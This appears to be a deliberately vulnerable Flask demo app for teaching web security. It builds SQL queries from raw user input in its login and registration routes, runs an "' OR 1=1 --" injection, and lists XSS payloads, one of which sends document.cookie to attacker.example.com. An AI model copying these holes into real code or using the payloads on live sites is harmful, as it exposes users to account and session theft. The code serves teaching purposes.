import sqlite3
from flask import Flask, render_template, request, redirect, url_for, flash, session
from werkzeug import security
import os
import re
from config import PASSWORD_CONFIG, PASSWORD_ERROR_MESSAGES

app = Flask(__name__)
app.secret_key = 'your_secret_key'  

def get_db_connection():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row  
    return conn

def init_db():
    if not os.path.exists('database.db'):
        conn = get_db_connection()
        with open('schema.sql') as f:
            conn.executescript(f.read())
        conn.commit()
        conn.close()
        print("Database initialized successfully")

def validate_password(password):
    """
    Validate password against configuration requirements
    Returns (is_valid, error_message)
    """
    if len(password) < PASSWORD_CONFIG['min_length']:
        return False, PASSWORD_ERROR_MESSAGES['min_length'].format(
            min_length=PASSWORD_CONFIG['min_length']
        )
    
    requirements_met = 0
    requirements_messages = []

    has_uppercase = any(c.isupper() for c in password)
    if has_uppercase:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_uppercase']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_uppercase'])
    
    # Check for lowercase letter
    has_lowercase = any(c.islower() for c in password)
    if has_lowercase:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_lowercase']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_lowercase'])
    
    # Check for digit
    has_digit = any(c.isdigit() for c in password)
    if has_digit:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_digit']:
        requirements_messages.append(PASSWORD_ERROR_MESSAGES['require_digit'])
    
    # Check for special character
    special_chars = PASSWORD_CONFIG['special_chars']
    has_special = any(c in special_chars for c in password)
    if has_special:
        requirements_met += 1
    elif PASSWORD_CONFIG['require_special_char']:
        requirements_messages.append(
            PASSWORD_ERROR_MESSAGES['require_special_char'].format(chars=special_chars)
        )
    
    # Check if we meet the minimum number of requirements
    min_requirements = PASSWORD_CONFIG['min_requirements']
    if requirements_met < min_requirements:
        return False, PASSWORD_ERROR_MESSAGES['min_requirements'].format(
            min_requirements=min_requirements
        )
    
    return True, ""

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db_connection()
    # Vulnerable query using string formatting
    user = conn.execute(f"SELECT username FROM users WHERE id = {session['user_id']}").fetchone()
    conn.close()
    
    return render_template('home.html', username=user['username'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Login route"""
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Input validation
        if not username or not password:
            flash('Username and password are required')
            return render_template('login.html')
        
        # Check if user exists and password is correct
        conn = get_db_connection()
        # Vulnerable query using string formatting
        user = conn.execute(f"SELECT * FROM users WHERE username = '{username}'").fetchone()
        conn.close()
        
        if user and security.check_password_hash(user['password'], password):
            # Store user ID in session
            session.clear()
            session['user_id'] = user['id']
            flash('Login successful!')
            return redirect(url_for('index'))
        
        flash('Invalid username or password')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """Registration route"""
    if request.method == 'POST':
        username = request.form['username']
        email = request.form['email']
        password = request.form['password']
        
        # Input validation
        if not username or not email or not password:
            flash('All fields are required')
            return render_template('register.html')
        
        # Validate password
        is_valid, error_message = validate_password(password)
        if not is_valid:
            flash(error_message)
            return render_template('register.html')
        
        # Check if username or email already exists
        conn = get_db_connection()
        # Vulnerable query using string formatting
        existing_user = conn.execute(f"SELECT id FROM users WHERE username = '{username}' OR email = '{email}'").fetchone()
        
        if existing_user:
            conn.close()
            flash('Username or email already exists')
            return render_template('register.html')
        
        # Hash the password for security
        hashed_password = security.generate_password_hash(password)
        
        # Insert new user into database - vulnerable query
        conn.execute(f"INSERT INTO users (username, email, password) VALUES ('{username}', '{email}', '{hashed_password}')")
        conn.commit()
        conn.close()
        
        flash('Registration successful! Please log in.')
        return redirect(url_for('login'))
    
    # Pass password requirements to the template
    password_requirements = {
        'min_length': PASSWORD_CONFIG['min_length'],
        'require_uppercase': PASSWORD_CONFIG['require_uppercase'],
        'require_lowercase': PASSWORD_CONFIG['require_lowercase'],
        'require_digit': PASSWORD_CONFIG['require_digit'],
        'require_special_char': PASSWORD_CONFIG['require_special_char'],
        'special_chars': PASSWORD_CONFIG['special_chars']
    }
    
    return render_template('register.html', password_requirements=password_requirements)

@app.route('/logout')
def logout():
    """Logout route"""
    session.clear()
    flash('You have been logged out')
    return redirect(url_for('login'))


@app.route('/sql_injection_demo')
def sql_injection_route():
    """Route to demonstrate SQL injection"""
    results = []
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    
    # The injected payload in the password field
    username = ""
    password = "' OR 1=1 --"
    
    # Vulnerable query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    users = cursor.fetchall()
    conn.close()
    
    # Format users for display
    for user in users:
        results.append(dict(zip([column[0] for column in cursor.description], user)))
    
    return render_template('sql_injection_demo.html', query=query, results=results)

def generate_xss_payload():
    """Generate a simple XSS payload for demonstration"""
    # Basic XSS payload that displays an alert
    basic_alert = "<script>alert('XSS Attack Successful!');</script>"
    
    # More complex payload that steals cookies
    cookie_stealer = "<script>fetch('https://attacker.example.com/steal?cookie='+document.cookie);</script>"
    
    # DOM manipulation payload
    dom_manipulator = "<script>document.body.style.backgroundColor='red'; document.body.innerHTML='<h1>Site Hacked!</h1>';</script>"
    
    return {
        "basic_alert": basic_alert,
        "cookie_stealer": cookie_stealer,
        "dom_manipulator": dom_manipulator
    }

@app.route('/xss_demo')
def xss_demo():
    """Route to demonstrate XSS vulnerabilities"""
    # Get name from query parameter (vulnerable to XSS)
    name = request.args.get('name', '')
    
    # Generate sample payloads
    payloads = generate_xss_payload()
    
    # Create examples of vulnerable code patterns
    vulnerable_code = {
        "direct_output": "app.route('/vulnerable')\ndef vulnerable():\n    name = request.args.get('name')\n    return f'<h1>Hello, {name}!</h1>'",
        "innerHTML": "document.getElementById('username').innerHTML = userName; // userName is user-controlled",
        "eval_usage": "eval('console.log(\"Welcome, ' + userName + '!\")'); // userName is user-controlled"
    }
    print(payloads)
    # Return a template that will render the name parameter without escaping
    return render_template('xss_demo.html', 
                          name=name, 
                          payloads=payloads, 
                          vulnerable_code=vulnerable_code,
                          example_url=request.host_url + "xss_demo?name=" + payloads["basic_alert"])

if __name__ == '__main__':
    # Initialize the database
    init_db()
    
    # Run the application on port 5000
    app.run(debug=True, port=5000)